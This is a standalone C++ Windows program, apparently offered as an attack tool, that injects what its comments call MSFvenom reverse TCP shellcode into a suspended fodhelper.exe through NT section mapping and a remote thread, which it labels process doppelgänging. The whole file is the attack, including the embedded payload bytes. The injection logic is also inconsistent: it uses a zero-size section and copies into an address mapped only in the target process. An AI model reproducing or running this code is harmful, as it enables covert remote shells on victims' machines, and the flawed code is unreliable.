#include <windows.h>
#include <winternl.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

// Define function pointers for NT functions
typedef NTSTATUS(NTAPI* NtCreateSection_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE, HANDLE);

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(
    HANDLE, PVOID);

typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);

typedef NTSTATUS(NTAPI* NtResumeThread_t)(
    HANDLE, PULONG);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, BOOLEAN, ULONG_PTR, ULONG_PTR, ULONG_PTR, PVOID);

// MSFvenom-generated shellcode (example for reverse TCP shell)
unsigned char shellcode[] =
    "\x27\xf5\xf8\x92\xf8\x9f\x48\x98\xf8\x37\x48\xfc\x48\x3f"
    "\xf8\xfc\x99\x27\x3f\x99\xf9\x27\x27\x41\x4b\x99\xfd\x49"
    "\xd6\x98\xf9\x43\x48\x31\xc9\x48\x81\xe9\xc3\xff\xff\xff"
    "\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x6a\xd5\x3c\x45\x87"
    "\x1c\xc4\xa0\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2"
    "\xf4\x22\xe4\xf5\x0d\x06\xf5\x0c\x5f\x95\x2a\x74\xc8\x82"
    "\xf3\x3b\x5f\x95\x9d\x87\xc1\xe7\xd1\x95\x71\x52\x3d\x88"
    "\x0d\xb6\x44\xe3\xe8\x47\x2d\xc3\xba\x78\xfe\x30\x6c\x3b"
    "\xd1\x25\x15\x56\x39\x8f\xdb\xf5\x50\xe0\x91\x50\x0b\x8f"
    "\xdb\x42\xa3\x43\x22\x3c\x11\xbf\x15\x4e\x1c\x25\xa5\xe7"
    "\xd3\x38\x09\xf2\xe7\x92\x6b\x5d\x00\x16\xa3\x40\xb5\x23"
    "\x4c\x29\x0f\xa1\x6d\xc1\x70\xa7\x4a\x04\x0f\xa1\xda\x32"
    "\x01\xca\x4d\x81\x76\xe7\xbf\x5a\xb5\x93\xfd\xdc\xb8\x73"
    "\x6a\x76\x02\x5d\x47\x0f\x44\x07\xb3\xbb\xfa\xf2\x5f\xd7"
    "\xf3\xc9\x32\x7e\x7e\xf4\x77\xd7\xf3\x7e\xc1\xee\xce\xd2"
    "\x05\xbf\x43\x87\xb8\xbb\x4a\x43\xaf\x60\x21\xce\x85\x0c"
    "\x84\xf9\x7c\xc9\x51\x7d\xf7\x64\x34\xca\xc3\xd0\x88\x3f"
    "\x93\xef\x64\x9a\xc1\x67\xb5\x74\xa5\x70\xbf\xd8\x62\x3a"
    "\x0e\xb5\xd1\x55\xcb\x06\x76\x54\xc5\xfd\xdb\x44\xf5\x65"
    "\x47\x34\x7e\x1d\x05\x36\x63\x21\x18\x25\x32\xb5\xcb\xef"
    "\x78\xbb\x32\xd6\xf1\xfe\x26\x35\xbf\xf3\x6a\x34\x6a\x74"
    "\xbe\x7c\xd7\x90\x03\xbe\x8d\x74\xf6\xb2\x05\x55\xe6\xf4"
    "\x76\xf2\xf6\xa3\x0c\x4a\x3f\xc3\xba\x82\x0f\x5f\x49\x8e"
    "\x3f\xd1\xe1\x74\xaf\x40\x35\x79\x2c\xbe\xb5\xb4\x7c\x3c"
    "\x28\xab\x99\xbe\xbd\x74\xf6\xb4\xbd\xee\x6e\x11\xe2\xa4"
    "\x96\x3d\x6e\xfb\xb5\xd5\xe6\xa0\xad\xef\x26\x41\xc7\x68"
    "\xd1\xcc\xc5\x64\x34\xc2\x3d\x46\x8b\xa0\xa3\x0c\x78\xdd"
    "\x6c\x32\x46\x2a\x4f\xf4\x35\xaa\x4a\x1c\x7d\xab\xa7\x0c"
    "\x1d\x2a\x21\x35\x46\x2a\xa7\x34\x64\xfa\x0a\x65\xf9\xaf"
    "\x9f\x8e\x3b\x75\xaa\xca\x6c\x68\x9d\x61\x5c\x6a\xe2\xec"
    "\x3a\x97\xf5\x64\x25\xf6\xc3\xd3\xd3\xef\xa1\x33\x5c\x33"
    "\xef\x41\xd8\x00\x22\xe1\xf4\xde\x46\xca\xf7\xf7\x82\x88"
    "\x5c\x5a\xff\x97\xef\x00\x22\x0c\x57\xc7\x2e\x35\x30\x1c"
    "\xa0\x33\x63\x9b\xbc\x5f\xab\xa6\xa1\x86\xc9\xcc\x8d\x71"
    "\x9d\xc3\xf6\x65\xb9\xee\x6e\x25\x7f\xff\xb3\x30\x64\xfc"
    "\x1c\x63\xff\xa9\xb9\x32\x62\xf9\x1c\x5d\xc0\x33\xc8\xe2"
    "\xcb\x7f\xc3\xd5\xf7\xa9\xb1\x9b\x04\xc2\x42\xb2\xa4\x9f"
    "\x08\xb1\x8f\x5a\xff\x97\xef\x97\x51\xf1\x89\x37\xb5\xe0"
    "\x85\xf9\x8b\x6e\xb4\x51\xaa\x40\xbc\x44\xb0\x77\x46\xc5"
    "\x20\x35\xea\x00\x22\x64\x34\xaa\x4a\x28\xf0\x70\xa0";

int main() {
    // Load ntdll.dll
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    // Resolve function addresses from ntdll.dll
    NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtCreateProcessEx_t NtCreateProcessEx = (NtCreateProcessEx_t)GetProcAddress(hNtdll, "NtCreateProcessEx");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtResumeThread_t NtResumeThread = (NtResumeThread_t)GetProcAddress(hNtdll, "NtResumeThread");

    // Step 1: Create a section object in-memory without touching the disk
    HANDLE hSection;
    LARGE_INTEGER liSize = { 0 };
    SIZE_T viewSize = 0;
    PVOID baseAddr = NULL;

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &liSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to create section" << std::endl;
        return -1;
    }

    // Step 2: Create the target process in a suspended state (e.g., notepad.exe)
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(L"C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create target process" << std::endl;
        return -1;
    }

    // Step 3: Map the section to the target process's memory
    status = NtMapViewOfSection(hSection, pi.hProcess, &baseAddr, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to map section" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Step 4: Inject shellcode into the mapped section
    memcpy(baseAddr, shellcode, sizeof(shellcode));

    // Step 5: Unmap the section from the current process
    status = NtUnmapViewOfSection(GetCurrentProcess(), baseAddr);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to unmap section" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Step 6: Create a thread in the target process and start execution
    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to create thread" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Step 7: Resume the main thread of the target process
    NtResumeThread(pi.hThread, NULL);

    std::cout << "In-memory Process Doppelgänging executed successfully with embedded shellcode" << std::endl;

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
